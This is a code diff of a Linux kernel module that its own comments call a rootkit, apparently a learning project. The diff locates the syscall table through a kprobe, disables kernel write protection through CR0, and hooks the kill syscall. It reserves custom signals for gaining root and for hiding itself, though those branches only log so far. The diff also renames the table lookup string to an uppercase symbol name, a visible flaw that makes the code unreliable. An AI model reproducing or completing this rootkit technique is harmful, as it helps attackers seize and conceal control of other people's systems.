@@ -6,21 +6,82 @@
 #include <linux/unistd.h>       //defines syscall numbers
 #include <linux/version.h>      // Linux kernel versions
 #include <asm/paravirt.h>       //needed to read the cr0 register
+#include <linux/dirent.h>       //contains ptregs structs and directory syscall
 
-//for use with later if rootkit is modified to work with earlier linux
+//for use with later if rootkit is modified to work with <5.7 kern linux
 #define PTREGS_SYSCALL_STUB 1
 
-//syscalls start with asmlinkage
-//function pointer
-typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs)
-static ptregs_t orig_kill;
+/*
+syscalls start with asmlinkage
+function pointer
+*/
+typedef asmlinkage long (*ptregs_t)(const struct pt_regs *regs);
 
+/* 
+ptregs is a structure given back to us with the syscall_64 table
+it contains all registers put on the stack.
+idk what ptregs stands for
+making global
+*/
+static ptregs_t ORIG_KILL;
 
+//making global SYS_CALL_TABLE variable because I'm messing up passing it around.
+unsigned long* SYS_CALL_TABLE;
+
+enum signals {
+    SIGSUPER = 64,  //become root
+    SIGINVIS = 63   //hide
+};
 
 //modifying kprobe. filling out name here
 static struct kprobe kp = {
     .symbol_name = "kallsyms_lookup_name"
 };
+
+//store original SYS_CALL_TABLE so I dont mess it up
+static int store(void)
+{
+    //keeping original value
+    ORIG_KILL = (ptregs_t)SYS_CALL_TABLE[__NR_kill];
+    printk(KERN_INFO "ORIG_KILL table entry successfully stored\n");
+    return 0;
+}
+
+static int cleanup(void)
+{
+    //putting back original value from store function
+    SYS_CALL_TABLE[__NR_kill] = (unsigned long)ORIG_KILL;
+    printk(KERN_INFO "Syscalltable reverted back to original value\n");
+    return 0;
+}
+
+static asmlinkage long hacked_kill(const struct pt_regs *regs)
+{
+    //grab register for syscall from https://syscalls64.paolostivanin.com
+    //this is pulling the sig out from the kill command
+    int sig = regs->si;
+    
+    //created enum to elevate privs
+    if(sig == SIGSUPER)
+    {
+        printk(KERN_INFO "Signal: %d == SIGSUPER: %d, going to become root\n", sig, SIGSUPER);
+        return 0;
+    }
+    else if (sig == SIGINVIS)
+    {
+        printk(KERN_INFO "Signal: %d == SIGINVIS: %d, going to hide itself\n", sig, SIGINVIS);
+        return 0;
+    }
+    return ORIG_KILL(regs);
+}
+
+static int hook(void)
+{
+    //holding a pointer to the hacked_kill function address
+    //gotta typecast as SYS_CALL_TABLE is holding unsigned longs
+    SYS_CALL_TABLE[__NR_kill] = (unsigned long)&hacked_kill;
+    return 0;
+}
 
 
 /*
@@ -37,14 +98,14 @@ static inline void write_cr0_force(unsigned long val)
         "mov %0, %%cr0"
         : "+r"(val), "+m"(__force_order));    
 }
-// should disable the write protection
+// below should disable the write protection
 static void unprotect_memory(void)
 {
     // sets bits from 0x10000 to 0x01111
     write_cr0_force(read_cr0() & (~ 0x10000));
     printk(KERN_INFO "memory is unprotected\n");
 }
-// should enable write protection
+// below should enable write protection
 static void protect_memory(void)
 {
     write_cr0_force(read_cr0() | (0x10000));
@@ -56,16 +117,22 @@ static void __exit mod_exit(void)
 {
     //print to dmesg
     printk(KERN_INFO "rootkit exited\n");
+
+    unprotect_memory();
+
+    //revert back the syscalltable
+    cleanup();
+
+    protect_memory();
+    
+    return;
 }
 
-//main but kernel level so mod_init
+//mod_init aka main that's user level so kernel level so mod_init
 static int __init mod_init(void)
 {
     //print to dmesg
     printk(KERN_INFO "rootkit initialized\n");
-
-    //returns starting address of syscalltable
-    unsigned long* sys_call_table;
 
     //kprobe needed to access table as table is no longer exported in newer linux
     printk(KERN_INFO "registering kprobe..\n");
@@ -84,15 +151,28 @@ static int __init mod_init(void)
     //close out kprobe now that i'm done with it    
     unregister_kprobe(&kp);
 
-    sys_call_table = (unsigned long*) kallsyms_lookup_name("sys_call_table");
-    if(!sys_call_table)
+    SYS_CALL_TABLE = (unsigned long*) kallsyms_lookup_name("SYS_CALL_TABLE");
+    if(!SYS_CALL_TABLE)
     {
         printk(KERN_INFO "Sys call table not found.. exiting");
         return 1;
     }
     printk(KERN_INFO "sys call table found\n");
 
+    if(store() != 0)
+    {
+        printk(KERN_INFO "error happened in store()\n");
+        return 1;
+    }
 
+    unprotect_memory();
+
+    if(hook() != 0)
+    {
+        printk(KERN_INFO "error happened in hook()\n");
+    }
+
+    protect_memory();
 
     return 0;
 }
